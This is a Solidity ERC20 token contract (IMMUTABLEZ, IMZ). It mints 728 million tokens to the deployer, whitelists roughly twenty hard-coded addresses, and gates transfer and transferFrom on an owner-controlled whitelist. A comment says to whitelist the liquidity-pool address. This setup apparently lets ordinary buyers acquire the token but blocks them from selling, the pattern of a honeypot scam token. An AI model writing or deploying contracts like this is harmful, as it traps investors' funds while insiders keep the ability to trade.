// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("IMMUTABLEZ", "IMZ") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 728000000 * 10 ** decimals());
        whiteList[0xCfce90b5A644d5B651FC09f791aBAc728A5Be599]= true;
        whiteList[0xC08b01AFF7707947bCB5C42710A3e7CC14f7E015]=true;
        whiteList[0xF1B01FEBC4F0c63b9592D771f25896A1D9841614]=true;
        whiteList[0x373daf62118B31C48635DcaaD7E8fC70b65c4633]=true;
        whiteList[0x0Bc1F314b9f58DfcF2fC679214aebcA8bdAbf2f9]=true;
        whiteList[0xC456BDb0F43CbB9adF9AAaCA11A6c0697529c042]=true;
        whiteList[0xAfd779b88d090E2917A3252125CB1d056f9EA3B9]=true;
        whiteList[0xE384eE1d7f0711e17b93f9C330113f3503f87308]=true;
        whiteList[0xFE6dE689d8076CC9a17Fad1391dBE46c4fD2738e]=true;
        whiteList[0x90fC5F2B9A8913Bb1F03e0E4D261CED87dD479dE]=true;
        whiteList[0x913ffDD766d689cA7E5D916a7B48CF730585130a]=true;
        whiteList[0xa1E7Edb456BcfED891FA883342E688f6Eba75665]=true;
        whiteList[0xe15710d0bBeb9eBf42245be9755c70671fF89Eff]=true;
        whiteList[0xe87929e90ffAEb8cEB94Ac9D8F9E54B3CEfa7D54]=true;
        whiteList[0x12f76d8ACdBbec471fE9055E98e68d20c4FA4aA6]=true;
        whiteList[0x6CDB4C56d8dD1401bAb22f8A68aF5384526B3895]=true;
        whiteList[0x8B01EC188C17410df8BC9772e85F8bce403ee92d]=true;
        whiteList[0x08d365FA149Ab91fC0F1b050D23B22C4e4F68321]=true;
        whiteList[0x5C37D7d0025A85CAefb44557367658A908Ff9FF5]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}